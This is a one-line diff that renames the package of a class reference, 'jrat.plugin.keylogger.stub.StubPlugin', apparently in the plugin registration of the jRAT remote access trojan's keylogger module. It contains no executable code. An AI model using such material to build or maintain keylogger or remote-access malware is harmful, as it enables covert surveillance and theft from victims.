@@ -1,1 +1,1 @@
-io.jrat.plugin.keylogger.stub.StubPlugin
+su.jrat.plugin.keylogger.stub.StubPlugin
